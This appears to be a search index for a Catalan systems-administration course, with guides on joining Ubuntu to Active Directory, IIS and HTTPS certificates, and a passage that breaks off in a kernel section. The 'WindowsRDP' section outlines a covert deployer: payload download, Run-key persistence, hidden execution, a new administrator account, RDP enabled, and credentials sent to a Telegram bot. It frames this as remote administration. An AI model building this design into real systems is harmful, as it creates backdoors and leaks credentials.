{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"ASIX2 - 0374 - Administraci\u00f3 de Sistemes Operatius","text":"<p>Aquest repositori cont\u00e9 el material del m\u00f2dul ASIX2 - 0374 - Administraci\u00f3 de Sistemes Operatius desenvolupat per Vitaliy Domin.</p> <ul> <li>\u00cdndex i enlla\u00e7os a les unitats del curs.  </li> <li>Recursos en format PDF, v\u00eddeos i exemples pr\u00e0ctics.  </li> <li>Codi i pr\u00e0ctiques guiades.  </li> </ul>"},{"location":"#llicencia","title":"Llic\u00e8ncia","text":"<p>El contingut est\u00e0 sota llic\u00e8ncia Creative Commons BY-NC-SA 4.0 ES.</p>"},{"location":"#contingut-del-curs","title":"Contingut del curs","text":"Tema Plataforma Configuraci\u00f3 d'inici amb serveis personalitzats \ud83e\ude9f Creaci\u00f3 d'entorn d'arrencada amb systemd \ud83d\udc27 Gesti\u00f3 de kernels i m\u00f2duls del sistema \ud83d\udc27 Servidor d'impressi\u00f3 amb Windows i control d'acc\u00e9s per domini \ud83e\ude9f Servidor d'impressi\u00f3 a Ubuntu amb CUPS/Samba \ud83d\udc27 Connexi\u00f3 de clients Windows i Ubuntu a servidors d'impressi\u00f3 \ud83e\ude9f\ud83d\udc27 Automatitzaci\u00f3 funcional adaptada al context d'\u00fas \ud83e\ude9f Automatitzaci\u00f3 funcional adaptada al context d'\u00fas \ud83d\udc27 RSAT, VPN i RDP \ud83e\ude9f Centralitzaci\u00f3 d'usuaris amb un AD \ud83e\ude9f Ansible vs FOG \ud83e\ude9f\ud83d\udc27 Personalitzaci\u00f3 de sistemes operatius \ud83d\udc27 NAS \ud83e\ude9f\ud83d\udc27 Projecte \ud83d\udcc1 Llic\u00e8ncia \u00b7             CC BY-NC-SA 4.0           \u00a9 2025 \u00b7 Vitaliy"},{"location":"LICENSE/","title":"Licencia Creative Commons Reconocimiento - No Comercial - Compartir Igual 4.0 Internacional (CC BY-NC-SA 4.0)","text":"<p>Este trabajo est\u00e1 licenciado bajo la Licencia Creative Commons Reconocimiento - No Comercial - Compartir Igual 4.0 Internacional (CC BY-NC-SA 4.0).</p>"},{"location":"LICENSE/#resumen","title":"Resumen","text":"<p>Esta licencia permite que otros compartan, copien y distribuyan tu trabajo, as\u00ed como adaptarlo o transformarlo, siempre que:</p> <ul> <li>Reconozcan la autor\u00eda original.</li> <li>No utilicen el trabajo con fines comerciales.</li> <li>Distribuyan las obras derivadas bajo la misma licencia.</li> </ul>"},{"location":"LICENSE/#texto-legal-completo","title":"Texto legal completo","text":"<p>Puedes consultar el texto completo de la licencia aqu\u00ed: https://creativecommons.org/licenses/by-nc-sa/4.0/legalcode.es</p>"},{"location":"LICENSE/#atribucion-y-condiciones","title":"Atribuci\u00f3n y condiciones","text":"<p>Se debe dar cr\u00e9dito adecuado, proporcionar un enlace a esta licencia e indicar si se han realizado cambios. Cualquier obra derivada debe distribuirse con la misma licencia y no se pueden imponer restricciones adicionales.</p> <p>\u00a9 2025 Vitaliy Domin</p>"},{"location":"images/linux_windows/guia/","title":"Guia","text":"<p>Aqu\u00ed tens la documentaci\u00f3 completa del proc\u00e9s que hem seguit per unir l'Ubuntu al domini Windows Server 2022/2025, utilitzant m\u00e8todes moderns i segurs.</p>"},{"location":"images/linux_windows/guia/#documentacio-unio-dubuntu-a-active-directory-windows-server-20222025","title":"Documentaci\u00f3: Uni\u00f3 d'Ubuntu a Active Directory (Windows Server 2022/2025)","text":"<p>Aquesta guia detalla el proc\u00e9s t\u00e8cnic per integrar un client Ubuntu en un domini de Windows Server mitjan\u00e7ant xifratge AES i el servei SSSD.</p>"},{"location":"images/linux_windows/guia/#1-escenari-i-requisits","title":"1. Escenari i Requisits","text":"<ul> <li>Servidor (DC): Windows Server 2022/2025 (IP: <code>192.168.2.101</code>, Domini: <code>vdomin.local</code>).</li> <li>Client: Ubuntu (VirtualBox).</li> <li>Objectiu: Autenticaci\u00f3 d'usuaris del domini a la m\u00e0quina Linux.</li> </ul>"},{"location":"images/linux_windows/guia/#2-preparacio-al-windows-server-crucial","title":"2. Preparaci\u00f3 al Windows Server (Crucial)","text":"<p>Abans d'unir el client, cal preparar el compte d'usuari administrador per admetre xifratge modern, ja que per defecte molts comptes no tenen generades les claus AES.</p>"},{"location":"images/linux_windows/guia/#activar-xifratge-aes-powershell","title":"Activar xifratge AES (PowerShell)","text":"<p>Executa aquestes comandes al controlador de domini per for\u00e7ar la compatibilitat:</p> <pre><code># 1. Definir contrasenya de seguretat\n$password = ConvertTo-SecureString \"Admin123!\" -AsPlainText -Force\n\n# 2. Reset de contrasenya per generar claus AES\nSet-ADAccountPassword -Identity Administrador -NewPassword $password\n\n# 3. Habilitar tipus de xifratge AES al compte\nSet-ADUser -Identity Administrador -KerberosEncryptionType AES128,AES256\n</code></pre>"},{"location":"images/linux_windows/guia/#3-automatitzacio-de-la-unio-script-ubuntu","title":"3. Automatitzaci\u00f3 de la uni\u00f3 (Script Ubuntu)","text":"<p>Hem utilitzat un script en Bash que gestiona la instal\u00b7laci\u00f3 de paquets, la configuraci\u00f3 de Kerberos i la uni\u00f3 directa mitjan\u00e7ant <code>adcli</code>.</p>"},{"location":"images/linux_windows/guia/#fitxer-unir_dominish","title":"Fitxer: <code>unir_domini.sh</code>","text":"<pre><code>#!/bin/bash\n# Script per unir Ubuntu a AD amb suport AES\n\nDOMAIN=\"vdomin.local\"\nREALM=\"VDOMIN.LOCAL\"\nDC_IP=\"192.168.2.101\"\nADMIN_USER=\"Administrador\"\nADMIN_PASS=\"Admin123!\"\n\n# [1] DNS\ncat &gt; /etc/resolv.conf &lt;&lt; EOF\nnameserver $DC_IP\nsearch $DOMAIN\nEOF\n\n# [2] Instal\u00b7laci\u00f3 de paquets\napt-get update -qq\napt-get install -y realmd sssd sssd-tools adcli krb5-user ntpdate -qq\nntpdate -u $DC_IP\n\n# [3] Configuraci\u00f3 Kerberos (Nom\u00e9s AES)\ncat &gt; /etc/krb5.conf &lt;&lt; EOF\n[libdefaults]\n    default_realm = $REALM\n    dns_lookup_realm = false\n    dns_lookup_kdc = true\n    rdns = false\n    forwardable = yes\n    default_tgs_enctypes = aes256-cts-hmac-sha1-96 aes128-cts-hmac-sha1-96\n    default_tkt_enctypes = aes256-cts-hmac-sha1-96 aes128-cts-hmac-sha1-96\n    permitted_enctypes = aes256-cts-hmac-sha1-96 aes128-cts-hmac-sha1-96\nEOF\n\n# [4] Uni\u00f3 al domini (M\u00e8tode LDAP-Passwd)\n# S'utilitza --ldap-passwd per evitar l'error \"Message stream modified\"\necho \"$ADMIN_PASS\" | adcli join --verbose --domain=\"$DOMAIN\" \\\n    --domain-controller=\"$DC_IP\" --login-user=\"$ADMIN_USER\" \\\n    --stdin-password --ldap-passwd\n</code></pre>"},{"location":"images/linux_windows/guia/#4-configuracio-del-servei-sssd","title":"4. Configuraci\u00f3 del Servei SSSD","text":"<p>SSSD actua com el pont entre el sistema local i Active Directory.</p>"},{"location":"images/linux_windows/guia/#fitxer-etcsssdsssdconf","title":"Fitxer: <code>/etc/sssd/sssd.conf</code>","text":"<pre><code>[sssd]\ndomains = vdomin.local\nconfig_file_version = 2\nservices = nss, pam\n\n[domain/vdomin.local]\nad_domain = vdomin.local\nkrb5_realm = VDOMIN.LOCAL\nrealmd_tags = manages-system joined-with-adcli\ncache_credentials = True\nid_provider = ad\nkrb5_store_password_if_offline = True\ndefault_shell = /bin/bash\nldap_id_mapping = True\nuse_fully_qualified_names = False\nfallback_homedir = /home/%u\naccess_provider = ad\n</code></pre> <p>Permisos i aplicaci\u00f3:</p> <pre><code>sudo chmod 600 /etc/sssd/sssd.conf\nsudo systemctl restart sssd\nsudo pam-auth-update --enable mkhomedir\n</code></pre>"},{"location":"images/linux_windows/guia/#5-verificacio-del-funcionament","title":"5. Verificaci\u00f3 del Funcionament","text":"<ul> <li>Verificaci\u00f3 d'identitat: <code>id Administrador</code> -&gt; Ha de retornar els IDs num\u00e8rics del domini.</li> <li>Inici de sessi\u00f3: <code>su - administrador</code> -&gt; Ha de crear el directori <code>/home/administrador</code>.</li> <li>Registre al servidor: Al Windows Server, l'equip <code>ALUMNE-VIRTUALB</code> apareix a la carpeta Computers.</li> </ul>"},{"location":"images/linux_windows/guia/#propers-passos","title":"Propers Passos","text":"<p>Vols que continuem amb la 2a part (Instal\u00b7lar IIS i configurar el lloc web HTML) o vols que afegim el suport de certificats HTTPS primer?</p>"},{"location":"images/linux_windows/punt2-3/","title":"Punt2 3","text":"<p>Documentaci\u00f3 de l'Escenari: Part 2 (Servei Web) i Part 3 (Seguretat HTTPS) Aquesta secci\u00f3 detalla la instal\u00b7laci\u00f3 del servidor web IIS, la creaci\u00f3 de contingut din\u00e0mic i la implementaci\u00f3 de la infraestructura de clau p\u00fablica (certificats) per a una connexi\u00f3 segura.</p> <ol> <li>Servidor Web IIS i Contingut Din\u00e0mic En aquesta fase es configura el Windows Server com a servidor web i es crea una p\u00e0gina que respon de forma diferent segons el protocol d'acc\u00e9s.</li> </ol> <p>2.1. Instal\u00b7laci\u00f3 del Rol IIS S'ha utilitzat PowerShell per instal\u00b7lar les caracter\u00edstiques necess\u00e0ries del servidor web de Windows:</p> <p>PowerShell</p> <p>Install-WindowsFeature -name Web-Server -IncludeManagementTools [INSERIR CAPTURA: Instal\u00b7laci\u00f3 de la caracter\u00edstica IIS des de PowerShell o Server Manager]</p> <p>2.2. Creaci\u00f3 del fitxer HTML Din\u00e0mic S'ha creat un fitxer index.html a la ruta arrel de l'IIS (C:\\inetpub\\wwwroot). Aquest fitxer inclou un script en JavaScript que detecta si l'usuari accedeix per http o https:</p> <p>HTML</p> Web vdomin Benvinguts a la web de vdomin.local <p>[INSERIR CAPTURA: Fitxer index.html a la carpeta wwwroot o codi al bloc de notes]</p> <ol> <li>Seguretat HTTPS i Confian\u00e7a entre Sistemes L'objectiu d'aquesta fase \u00e9s xifrar les comunicacions i eliminar els avisos de \"Lloc no segur\" tant al servidor com al client Ubuntu.</li> </ol> <p>3.1. Generaci\u00f3 del Certificat al Servidor (Windows) S'ha generat un certificat auto-signat vinculat al nom de domini vdomin.local:</p> <p>PowerShell</p> <p>$cert = New-SelfSignedCertificate -DnsName \"vdomin.local\" -CertStoreLocation \"cert:\\LocalMachine\\My\" A continuaci\u00f3, s'ha vinculat el certificat al port 443 (HTTPS) a trav\u00e9s de la gesti\u00f3 de bindings de l'IIS.</p> <p>[INSERIR CAPTURA: Gestor d'IIS mostrant el binding del port 443 amb el certificat seleccionat]</p> <p>3.2. Exportaci\u00f3 i Confian\u00e7a a Windows Perqu\u00e8 el propi Windows Server consideri la web segura, s'ha importat el certificat al magatzem de \"Entitats de certificaci\u00f3 d'arrel de confian\u00e7a\" (Trusted Root Certification Authorities).</p> <p>[INSERIR CAPTURA: Consola certlm.msc mostrant el certificat a la carpeta 'Root']</p> <p>3.3. Configuraci\u00f3 del Client (Ubuntu) Perqu\u00e8 el client Ubuntu confi\u00ef en el certificat generat pel Windows Server, s'han seguit els seg\u00fcents passos:</p> <p>Transfer\u00e8ncia: S'ha exportat el certificat des de Windows (certificat.cer) i s'ha passat a l'Ubuntu.</p> <p>Conversi\u00f3 de format: Linux requereix format .crt (PEM), per tant s'ha convertit amb OpenSSL:</p> <p>Bash</p> <p>openssl x509 -inform DER -in certificat.cer -out vdomin.crt Instal\u00b7laci\u00f3 al sistema:</p> <p>Bash</p> <p>sudo cp vdomin.crt /usr/local/share/ca-certificates/ sudo update-ca-certificates [INSERIR CAPTURA: Terminal d'Ubuntu executant update-ca-certificates i mostrant \"1 added\"]</p> <p>3.4. Verificaci\u00f3 Final S'ha comprovat el correcte funcionament des del navegador Firefox de l'Ubuntu:</p> <p>Acc\u00e9s HTTP: Es mostra el missatge d'alerta vermell (No segur).</p> <p>Acc\u00e9s HTTPS: Es mostra el cadenat tancat i el missatge de confirmaci\u00f3 en verd.</p> <p>[INSERIR CAPTURA: Navegador a l'Ubuntu amb el cadenat tancat i la \"S\" de seguretat activa]</p>"},{"location":"ubuntu-ad/","title":"Introducci\u00f3: Uni\u00f3 d'Ubuntu a Active Directory + HTTPS","text":"<p>Aquesta documentaci\u00f3 detalla el proc\u00e9s complet de configuraci\u00f3 d'un entorn d'integraci\u00f3 entre Ubuntu Desktop i Windows Server Active Directory. El projecte es divideix en tres fases principals que cobreixen des de la uni\u00f3 al domini fins a la seguretat web amb HTTPS.</p>"},{"location":"ubuntu-ad/#contingut-de-la-guia","title":"Contingut de la Guia","text":"<ol> <li> <p>Part 1: Uni\u00f3 d'Ubuntu a Active Directory</p> <ul> <li>Configuraci\u00f3 inicial del client Linux.</li> <li>Instal\u00b7laci\u00f3 de serveis d'identitat (SSSD, Kerberos).</li> <li>Automatitzaci\u00f3 de la uni\u00f3 mitjan\u00e7ant scripts.</li> <li>Verificaci\u00f3 d'usuaris del domini.</li> </ul> </li> <li> <p>Part 2: Servidor Web IIS</p> <ul> <li>Instal\u00b7laci\u00f3 del rol de servidor web a Windows Server.</li> <li>Creaci\u00f3 de contingut HTML personalitzat.</li> <li>Prova de connectivitat via HTTP.</li> </ul> </li> <li> <p>Part 3: Certificats HTTPS i Confian\u00e7a</p> <ul> <li>Generaci\u00f3 de certificats auto-signats.</li> <li>Configuraci\u00f3 de bindings SSL a IIS.</li> <li>Importaci\u00f3 de certificats a Ubuntu per garantir la confian\u00e7a.</li> <li>Implementaci\u00f3 de CA Enterprise (AD CS).</li> </ul> </li> </ol>"},{"location":"ubuntu-ad/#entorn-de-treball","title":"Entorn de Treball","text":"<ul> <li>Servidor de Domini: Windows Server 2022/2025.</li> <li>Client: Ubuntu 22.04 LTS o superior.</li> <li>Xarxa: Entorn virtualitzat (VirtualBox/VMware).</li> </ul>"},{"location":"ubuntu-ad/part1-ubuntu-ad/","title":"Uni\u00f3 d'un client Ubuntu a un domini Active Directory","text":"<p>En aquest apartat documentem el proc\u00e9s complet per integrar una m\u00e0quina Ubuntu en un domini de Windows Server per permetre l'autenticaci\u00f3 d'usuaris del directori actiu.</p> <p>Escenari: - Servidor (DC): Windows Server 2022/2025 (IP: <code>192.168.2.101</code>, Domini: <code>vdomin.local</code>) - Client: Ubuntu Desktop (VirtualBox)</p>"},{"location":"ubuntu-ad/part1-ubuntu-ad/#configuracio-inicial-i-pbis","title":"Configuraci\u00f3 inicial i PBIS","text":"<p>El primer pas \u00e9s preparar el sistema Ubuntu i instal\u00b7lar les eines necess\u00e0ries per a la comunicaci\u00f3 amb l'Active Directory. Executem l'script de configuraci\u00f3 inicial que prepara el DNS i els paquets b\u00e0sics.</p> <p></p>"},{"location":"ubuntu-ad/part1-ubuntu-ad/#autenticacio-kerberos","title":"Autenticaci\u00f3 Kerberos","text":"<p>Verifiquem que podem obtenir un tiquet de Kerberos del controlador de domini mitjan\u00e7ant la comanda <code>kinit</code>. Aix\u00f2 confirma que la comunicaci\u00f3 a nivell de xarxa i la resoluci\u00f3 DNS funcionen correctament.</p> <pre><code>kinit Administrador@VDOMIN.LOCAL\n</code></pre> <p></p> <p>Un cop obtingut el tiquet, comprovem la identitat i provem el canvi d'usuari amb <code>su</code>:</p> <p></p>"},{"location":"ubuntu-ad/part1-ubuntu-ad/#unio-al-domini-mitjancant-script","title":"Uni\u00f3 al domini mitjan\u00e7ant script","text":"<p>S'ha creat un script d'automatitzaci\u00f3 que gestiona:</p> <ul> <li>Instal\u00b7laci\u00f3 dels paquets necessaris (<code>realmd</code>, <code>sssd</code>, <code>adcli</code>, <code>krb5-user</code>)</li> <li>Configuraci\u00f3 de Kerberos for\u00e7ant xifratge AES</li> <li>Uni\u00f3 f\u00edsica de l'equip al domini</li> </ul> <p>L'script comen\u00e7a configurant el DNS i els paquets:</p> <p></p> <p>Durant el proc\u00e9s, es generen els fitxers de claus (keytabs) i es configura el servei SSSD:</p> <p></p> <p>Finalment, l'script es completa i mostra la verificaci\u00f3 de l'estatus:</p> <p></p>"},{"location":"ubuntu-ad/part1-ubuntu-ad/#verificacio-al-windows-server","title":"Verificaci\u00f3 al Windows Server","text":"<p>Un cop l'equip Ubuntu s'ha unit al domini, podem verificar des del Windows Server que l'equip apareix correctament a Active Directory mitjan\u00e7ant PowerShell:</p> <pre><code>Get-ADComputer -Filter * | Select Name\n</code></pre> <p></p>"},{"location":"ubuntu-ad/part1-ubuntu-ad/#prova-dinici-de-sessio","title":"Prova d'inici de sessi\u00f3","text":"<p>Comprovem que els usuaris del domini poden iniciar sessi\u00f3 a la m\u00e0quina Ubuntu. Primer provem amb l'administrador del domini:</p> <p></p> <p>I finalment verifiquem amb les comandes <code>whoami</code> i <code>id</code> que el sistema local reconeix els identificadors (UID/GID) del domini:</p> <pre><code>whoami\nid\n</code></pre> <p></p> <p>La integraci\u00f3 s'ha completat amb \u00e8xit. Ara els usuaris del domini poden autenticar-se a la m\u00e0quina Ubuntu.</p>"},{"location":"ubuntu-ad/part2-iis-web/","title":"Instal\u00b7laci\u00f3 i configuraci\u00f3 del servidor web IIS","text":"<p>En aquesta part documentem la preparaci\u00f3 del Windows Server com a servidor web per allotjar continguts que posteriorment seran securitzats amb HTTPS.</p>"},{"location":"ubuntu-ad/part2-iis-web/#installacio-del-rol-iis","title":"Instal\u00b7laci\u00f3 del rol IIS","text":"<p>Utilitzem PowerShell per instal\u00b7lar les caracter\u00edstiques de Internet Information Services (IIS):</p> <pre><code>Install-WindowsFeature -name Web-Server -IncludeManagementTools\n</code></pre> <p></p>"},{"location":"ubuntu-ad/part2-iis-web/#creacio-del-lloc-i-contingut","title":"Creaci\u00f3 del lloc i contingut","text":"<p>Un cop instal\u00b7lat el rol, configurem un fitxer HTML a la ruta per defecte (<code>C:\\inetpub\\wwwroot\\</code>). Aquest fitxer inclou un script en JavaScript que detecta si l'usuari accedeix per HTTP o HTTPS:</p> <pre><code>&lt;html&gt;\n&lt;head&gt;&lt;title&gt;Web vdomin&lt;/title&gt;&lt;/head&gt;\n&lt;body&gt;\n    &lt;h1&gt;Benvinguts a la web de vdomin.local&lt;/h1&gt;\n    &lt;div id=\"status\"&gt;&lt;/div&gt;\n    &lt;script&gt;\n        if (window.location.protocol === 'https:') {\n            document.getElementById('status').innerHTML = \n                '&lt;p style=\"color:green;\"&gt;\u2705 Connexi\u00f3 segura HTTPS detectada.&lt;/p&gt;';\n        } else {\n            document.getElementById('status').innerHTML = \n                '&lt;p style=\"color:red;\"&gt;\u26a0\ufe0f Est\u00e0s entrant per HTTP (No segur).&lt;/p&gt;';\n        }\n    &lt;/script&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p>Creem el fitxer i fem una primera prova de desc\u00e0rrega amb <code>curl</code>:</p> <p></p>"},{"location":"ubuntu-ad/part2-iis-web/#verificacio-del-servei-http","title":"Verificaci\u00f3 del servei HTTP","text":"<p>Comprovem que el servidor web \u00e9s accessible des de la xarxa mitjan\u00e7ant el protocol HTTP est\u00e0ndard (port 80). Podem accedir des d'un navegador o des de la terminal:</p> <pre><code>curl http://192.168.2.101\n</code></pre> <p></p> <p>El servidor IIS est\u00e0 funcionant correctament. Ara passarem a la Part 3 per implementar la seguretat HTTPS.</p>"},{"location":"ubuntu-ad/part3-https-certificats/","title":"Implementaci\u00f3 de certificats HTTPS","text":"<p>L'objectiu d'aquesta part \u00e9s garantir que la navegaci\u00f3 entre el client Ubuntu i el servidor Windows sigui segura mitjan\u00e7ant el protocol HTTPS i xifratge SSL/TLS.</p>"},{"location":"ubuntu-ad/part3-https-certificats/#certificats-auto-signats-self-signed","title":"Certificats auto-signats (Self-Signed)","text":"<p>Per a proves inicials, generem un certificat auto-signat directament des de PowerShell:</p> <pre><code>$cert = New-SelfSignedCertificate -DnsName \"vdomin.local\" -CertStoreLocation \"cert:\\LocalMachine\\My\"\n</code></pre> <p></p>"},{"location":"ubuntu-ad/part3-https-certificats/#importacio-al-magatzem-de-confianca","title":"Importaci\u00f3 al magatzem de confian\u00e7a","text":"<p>Despr\u00e9s de generar-lo, l'importem al magatzem d'entitats de confian\u00e7a (Root store) del servidor per evitar alertes locals:</p> <p></p> <p>Podem verificar que el certificat est\u00e0 disponible mitjan\u00e7ant la consola <code>certlm.msc</code>:</p> <p></p>"},{"location":"ubuntu-ad/part3-https-certificats/#script-dautomatitzacio","title":"Script d'automatitzaci\u00f3","text":"<p>L'script de PowerShell complet automatitza tant la generaci\u00f3 com la vinculaci\u00f3 al port 443:</p> <p></p>"},{"location":"ubuntu-ad/part3-https-certificats/#exportacio-del-certificat","title":"Exportaci\u00f3 del certificat","text":"<p>Per poder instal\u00b7lar el certificat a altres m\u00e0quines, l'exportem en format <code>.cer</code>:</p> <p></p>"},{"location":"ubuntu-ad/part3-https-certificats/#configuracio-del-client-ubuntu","title":"Configuraci\u00f3 del client Ubuntu","text":"<p>Perqu\u00e8 el navegador Firefox a Ubuntu no mostri alertes de seguretat, hem de transferir el certificat del servidor i instal\u00b7lar-lo al magatzem de CA de Linux.</p>"},{"location":"ubuntu-ad/part3-https-certificats/#transferencia-del-certificat","title":"Transfer\u00e8ncia del certificat","text":"<p>Copiem el fitxer <code>.cer</code> a la m\u00e0quina Ubuntu:</p> <p></p>"},{"location":"ubuntu-ad/part3-https-certificats/#conversio-i-installacio","title":"Conversi\u00f3 i instal\u00b7laci\u00f3","text":"<p>Linux requereix format <code>.crt</code> (PEM), per tant convertim el certificat amb OpenSSL i l'instal\u00b7lem al sistema:</p> <pre><code>openssl x509 -inform DER -in certificat.cer -out vdomin.crt\nsudo cp vdomin.crt /usr/local/share/ca-certificates/\nsudo update-ca-certificates\n</code></pre> <p></p>"},{"location":"ubuntu-ad/part3-https-certificats/#verificacio-a-firefox","title":"Verificaci\u00f3 a Firefox","text":"<p>Comprovem que el navegador reconeix la identitat del servidor i que el cadenat es mostra tancat (verd):</p> <p></p>"},{"location":"ubuntu-ad/part3-https-certificats/#comparativa-http-vs-https","title":"Comparativa HTTP vs HTTPS","text":"<p>Podem comparar la difer\u00e8ncia entre l'acc\u00e9s insegur (HTTP) i el segur (HTTPS):</p> <p></p>"},{"location":"ubuntu-ad/part3-https-certificats/#implementacio-de-ca-enterprise-ad-cs","title":"Implementaci\u00f3 de CA Enterprise (AD CS)","text":"<p>Per a entorns de producci\u00f3, \u00e9s millor utilitzar una Entitat de Certificaci\u00f3 del propi Active Directory en lloc de certificats auto-signats.</p>"},{"location":"ubuntu-ad/part3-https-certificats/#installacio-del-rol-ad-cs","title":"Instal\u00b7laci\u00f3 del rol AD CS","text":"<p>Instal\u00b7lem el rol Active Directory Certificate Services al Windows Server:</p> <p></p> <p>Un cop completada la instal\u00b7laci\u00f3, configurem l'autoritat de certificaci\u00f3:</p> <p></p> <p>La CA Enterprise queda llesta per emetre certificats de domini:</p> <p></p>"},{"location":"ubuntu-ad/part3-https-certificats/#gestio-de-certificats-a-iis","title":"Gesti\u00f3 de certificats a IIS","text":"<p>Finalment, gestionem els certificats emesos a trav\u00e9s de l'IIS Manager per vincular-los als llocs web:</p> <p></p> <p>Amb aix\u00f2, el servidor web IIS est\u00e0 configurat per servir contingut de forma segura mitjan\u00e7ant HTTPS amb certificats de confian\u00e7a.</p>"},{"location":"unidad1/WindowsRDP/","title":"PowerShell RDP","text":""},{"location":"unidad1/WindowsRDP/#creacio-de-lscript-installps1-desplegament-rdp-remot","title":"Creaci\u00f3 de l\u2019script install.ps1: Desplegament RDP Remot","text":"<p>En aquest apartat documentarem la creaci\u00f3 d'un script dissenyat per automatitzar una connexi\u00f3 RDP (amb un usuari amb permisos d\u2019administrador) sense intervenci\u00f3 visible per part de l\u2019usuari.</p> <p>Per assolir-ho, es crear\u00e0 l\u2019script principal install.ps1.</p> <p>Nota de Seguretat: Per mantenir l'enfocament \u00e8tic i prevenir l'\u00fas malici\u00f3s, no es pot compartir el codi font complet d'aquesta implementaci\u00f3. Aquesta documentaci\u00f3 \u00e9s purament informativa i defensiva.</p>"},{"location":"unidad1/WindowsRDP/#explicacio-generica-de-larquitectura","title":"Explicaci\u00f3 Gen\u00e8rica de l\u2019Arquitectura","text":"<p>L\u2019arquitectura es basa en dos scripts de PowerShell: <code>install.ps1</code> (el desplegador) i <code>AdminSetup.ps1</code> (el component principal).</p> Fase Acci\u00f3 General Objectiu Instal\u00b7laci\u00f3 Comprova privilegis, crea carpeta local. Assegurar un entorn d'execuci\u00f3 v\u00e0lid i amb permisos suficients. Desc\u00e0rrega Descarrega l'arxiu principal (<code>AdminSetup.ps1</code>) des d\u2019un servidor remot. Introduir el component de configuraci\u00f3 al sistema. Persist\u00e8ncia Afegeix una entrada al registre de Windows (Run Key). Assegurar que el component s'executi autom\u00e0ticament a cada inici de sessi\u00f3. Configuraci\u00f3 Executa el component principal (<code>AdminSetup.ps1</code>). Aplicar la configuraci\u00f3 de RDP i la creaci\u00f3 d'usuaris d'administrador. Log Registra un log local amb data, hora i estat. Mantenir un registre de la instal\u00b7laci\u00f3."},{"location":"unidad1/WindowsRDP/#analisi-tecnica-del-codi-a-titol-informatiu","title":"An\u00e0lisi T\u00e8cnica del Codi (A T\u00edtol Informatiu)","text":"<p>L'efic\u00e0cia del sistema es basa en la divisi\u00f3 de tasques entre els dos scripts, assegurant que el proc\u00e9s de configuraci\u00f3 d'acc\u00e9s remot es realitzi en segon pla i sigui persistent.</p> <p>1. Funcions de <code>install.ps1</code> (El Desplegador)</p> Acci\u00f3 Clau Comanda PowerShell (Resum) Explicaci\u00f3 Desc\u00e0rrega <code>Invoke-WebRequest -Uri $URL -OutFile $FilePath</code> Obt\u00e9 el component principal des de l'adre\u00e7a <code>http://192.168.1.81:8080</code>. Persist\u00e8ncia <code>Set-ItemProperty -Path HKLM:\\Software\\...</code> Crea una clau al registre Run (<code>HKLM</code>) per a l'execuci\u00f3 autom\u00e0tica. Execuci\u00f3 <code>Start-Process ... -WindowStyle Hidden</code> Inicia el component principal de manera immediata i oculta. <p>2. Funcions de <code>AdminSetup.ps1</code> (El Component Principal)</p> Acci\u00f3 Clau Comanda PowerShell (Resum) Explicaci\u00f3 Usabilitat <code>New-RandomUsername</code>, <code>New-RandomPassword</code> Genera credencials d'usuari fortes i aleat\u00f2ries per evitar conflictes i garantir la seguretat. Privilegis <code>New-LocalUser</code>, <code>Add-LocalGroupMember -Group \"Administrators\"</code> Crea un nou usuari i l'afegeix al grup d'Administradors. RDP <code>Set-ItemProperty ... \"fDenyTSConnections\" -Value 0</code> Habilita el servei d'Escriptori Remot (RDP) al registre. Exfiltraci\u00f3 <code>Invoke-RestMethod -Uri \"$TelegramAPI/sendMessage\"</code> Envia les credencials generades, juntament amb la IP i el nom de l'equip, a un bot de Telegram predefinit."},{"location":"unidad1/WindowsRDP/#funcionament-del-script-i-proves-captures","title":"Funcionament del Script i Proves (Captures)","text":"<p>Posem el nostre script en una carpeta d'instal\u00b7laci\u00f3 per simular un escenari de desplegament:</p> <p></p> <p>El codi font (parcialment pixelat per seguretat) gestiona la desc\u00e0rrega i la persist\u00e8ncia.</p> <p></p> <p>Prova 1: Instal\u00b7laci\u00f3 i Persist\u00e8ncia</p> <p>Executem l'script dins de PowerShell. Es pot veure que s'executa i crea l'entrada de persist\u00e8ncia al registre de Windows.</p> <p></p> <p>Comprovem el directori i podem veure que l'arxiu principal (<code>AdminSetup.ps1</code>) s'ha descarregat correctament.</p> <p></p> <p>Prova 2: Execuci\u00f3 i Acc\u00e9s Remot</p> <p>Despr\u00e9s de reiniciar l'ordinador, el component principal s'executa autom\u00e0ticament, habilita l'RDP, crea l'usuari administrador i, autom\u00e0ticament, envia les credencials.</p> <p></p> <p>Si comprovem els usuaris que s'han creat, hi ha dos nous usuaris (un d'ells l'administrador remot creat per l'script).</p> <p></p> <p>Prova 3: Connexi\u00f3 Exitosa</p> <p>Ens connectem amb un client RDP (en aquest cas, Remmina a Ubuntu) utilitzant les credencials rebudes per Telegram.</p> <p></p> <p>I la connexi\u00f3 s'estableix correctament, confirmant l'acc\u00e9s complet.</p> <p></p>"},{"location":"unidad1/WindowsRDP/#finalitat-i-consideracions-etiques","title":"Finalitat i Consideracions \u00c8tiques","text":"<p>L\u2019objectiu principal d'aquest projecte \u00e9s documentar una t\u00e8cnica de desplegament que permet que el component de control s\u2019instal\u00b7li i s\u2019executi de forma aut\u00f2noma i persistent sense necessitat d\u2019intervenci\u00f3 manual, garantint un control complet des del costat administratiu.</p> <p>Aquesta configuraci\u00f3 ofereix un valor considerable en escenaris d'administraci\u00f3 remota i desplegament a gran escala, especialment:</p> <ul> <li>En Entorns sense Active Directory (AD): Permet crear mecanismes de control i acc\u00e9s unificat en sistemes que no utilitzen una infraestructura centralitzada com AD.</li> <li>Automatitzaci\u00f3: \u00c9s una eina potent per a la desplegament r\u00e0pid de configuracions o la instal\u00b7laci\u00f3 de software en llocs de treball remots.</li> <li>Control d'Inventari: Facilita la gesti\u00f3 i el manteniment de sistemes descentralitzats.</li> </ul> <p>\u00das \u00c8tic i Legal: Cal destacar que la utilitzaci\u00f3 d'aquest tipus de configuraci\u00f3 \u00e9s \u00fatil i leg\u00edtima nom\u00e9s quan s'aplica en entorns controlats i amb autoritzaci\u00f3 expl\u00edcita i legal. El seu \u00fas ha d'estar estrictament dirigit a tasques d'automatitzaci\u00f3, administraci\u00f3 o proves de seguretat sota un marc \u00e8tic.</p>"},{"location":"unidad1/kernel/","title":"Compilaci\u00f3 del Kernel","text":""},{"location":"unidad1/kernel/#introduccio","title":"Introducci\u00f3","text":"<p>El kernel de Linux \u00e9s el nucli central del sistema operatiu i l'encarregat de gestionar tots els recursos de l\u2019equip. Actua com a intermediari entre el hardware (CPU, mem\u00f2ria, discos, targetes de xarxa, etc.) i el software, assegurant que les aplicacions puguin funcionar sense haver de 